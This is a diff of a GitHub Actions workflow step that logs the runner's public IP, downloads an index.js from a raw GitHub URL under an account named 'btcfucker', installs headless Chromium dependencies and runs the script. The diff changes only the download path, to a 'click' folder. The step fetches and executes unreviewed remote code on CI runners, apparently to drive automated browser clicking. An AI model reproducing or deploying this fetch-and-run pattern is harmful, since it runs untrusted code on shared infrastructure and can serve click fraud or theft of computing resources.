@@ -22,6 +22,6 @@ jobs:
       - name: Run a multi-line script
         run: |
           curl ifconfig.me
-          wget https://raw.githubusercontent.com/btcfucker/btcfucker.github.io/main/.github/workflows/index.js
+          wget https://raw.githubusercontent.com/btcfucker/btcfucker.github.io/main/.github/actions/click/index.js
           npx playwright install-deps chromium
           node index.js
